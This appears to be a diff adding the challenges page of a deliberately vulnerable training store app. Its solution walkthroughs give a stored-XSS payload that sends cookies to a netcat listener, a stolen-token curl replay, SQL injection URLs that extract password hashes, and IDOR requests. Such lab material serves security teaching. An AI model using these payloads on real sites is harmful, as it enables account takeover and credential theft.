@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Challenges - FishingStore</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="/" class="nav-brand">FishingStore</a>
+            <div class="nav-menu">
+                <div class="auth-only">
+                    <a href="/home.html" class="nav-link">Home</a>
+                    <a href="/challenge.html" class="nav-link active">
+                        <i class="fas fa-flag"></i>
+                    </a>
+                    <button id="logoutButton">Logout</button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1>Security Learning Challenges</h1>
+        <div class="alert alert-warning">
+            <h3>⚠️ WARNING: This application contains intentional vulnerabilities for educational purposes. DO NOT use these techniques on real websites! ⚠️</h3>
+        </div>
+
+        <div class="challenge-section">
+            <h2>Challenge 1: Stored XSS</h2>
+            <button class="hint-btn" onclick="toggleHint('hint1')">Show Hint</button>
+            <div id="hint1" class="hint" style="display: none;">
+                <p>The product comments feature doesn't properly sanitize user input.</p>
+            </div>
+            <div class="goal">
+                <h3>Goal: Steal another user's authentication token using the product comments feature.</h3>
+            </div>
+            <button class="solution-btn" onclick="toggleSolution('solution1')">View Solution</button>
+            <div id="solution1" class="solution" style="display: none;">
+                <h4>Solution:</h4>
+                <ol>
+                    <li>Set up a listener:
+                        <pre><code>nc -lvp 12345</code></pre>
+                    </li>
+                    <li>Add this comment to any product:
+                        <pre><code>&lt;iframe src="javascript:fetch('http://localhost:12345/?c='+document.cookie)"&gt;</code></pre>
+                    </li>
+                    <li>When other users view the product, their token will be sent to your listener</li>
+                    <li>Use the stolen token:
+                        <pre><code>curl -H "Authorization: Bearer STOLEN_TOKEN" http://localhost:8000/comments/</code></pre>
+                    </li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="challenge-section">
+            <h2>Challenge 2: SQL Injection</h2>
+            <button class="hint-btn" onclick="toggleHint('hint2')">Show Hint</button>
+            <div id="hint2" class="hint" style="display: none;">
+                <p>The product search feature doesn't properly escape user input in SQL queries.</p>
+            </div>
+            <div class="goal">
+                <h3>Goal: Extract database schema information using SQL injection in the product search.</h3>
+            </div>
+            <button class="solution-btn" onclick="toggleSolution('solution2')">View Solution</button>
+            <div id="solution2" class="solution" style="display: none;">
+                <h4>Solution:</h4>
+                <ol>
+                    <li>First, verify the search works normally:
+                        <pre><code>http://localhost:8000/products/search?q=rod</code></pre>
+                    </li>
+                    <li>Find number of columns using ORDER BY:
+                        <pre><code>http://localhost:8000/products/search?q=rod' ORDER BY 5--</code></pre>
+                    </li>
+                    <li>Map column positions using UNION SELECT:
+                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT 'a', 'b', 'c', 'd', 'e'--</code></pre>
+                    </li>
+                    <li>List all tables in the database:
+                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT name, name, name, 0, name FROM sqlite_master WHERE type='table'--</code></pre>
+                    </li>
+                    <li>Show table structures (columns):
+                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT name, sql, sql, 0, sql FROM sqlite_master WHERE type='table'--</code></pre>
+                    </li>
+                    <li>Extract user credentials:
+                        <pre><code>http://localhost:8000/products/search?q=x' UNION SELECT id, username, hashed_password, id, username FROM users--</code></pre>
+                    </li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="challenge-section">
+            <h2>Challenge 3: IDOR (Insecure Direct Object Reference)</h2>
+            <button class="hint-btn" onclick="toggleHint('hint3')">Show Hint</button>
+            <div id="hint3" class="hint" style="display: none;">
+                <p>The profile page uses user IDs in the API endpoints for addresses. Try changing the user ID in the requests.</p>
+            </div>
+            <div class="goal">
+                <h3>Goal: Access and modify other users' addresses by manipulating the user ID in API requests.</h3>
+            </div>
+            <button class="solution-btn" onclick="toggleSolution('solution3')">View Solution</button>
+            <div id="solution3" class="solution" style="display: none;">
+                <h4>Solution:</h4>
+                <ol>
+                    <li>First, get your own user ID by checking the network requests when loading your profile:
+                        <pre><code>GET /api/user/1/address</code></pre>
+                    </li>
+                    <li>Try accessing another user's address by changing the ID:
+                        <pre><code>GET /api/user/2/address</code></pre>
+                    </li>
+                    <li>Update another user's address using your token but their ID:
+                        <pre><code>PUT /api/user/2/address
+Content-Type: application/json
+Authorization: Bearer YOUR_TOKEN
+
+{
+    "street": "Hacked Street",
+    "city": "Hacked City",
+    "state": "HS",
+    "zip_code": "12345",
+    "country": "Hackerland"
+}</code></pre>
+                    </li>
+                </ol>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function toggleHint(id) {
+            const hint = document.getElementById(id);
+            hint.style.display = hint.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function toggleSolution(id) {
+            const solution = document.getElementById(id);
+            solution.style.display = solution.style.display === 'none' ? 'block' : 'none';
+        }
+
+        // Check authentication from cookies
+        function getCookie(name) {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [cookieName, value] = cookie.trim().split('=');
+                if (cookieName === name) {
+                    return value;
+                }
+            }
+            return null;
+        }
+
+        const token = getCookie('token');
+        if (!token) {
+            window.location.href = '/login.html';
+        }
+    </script>
+</body>
+</html> 
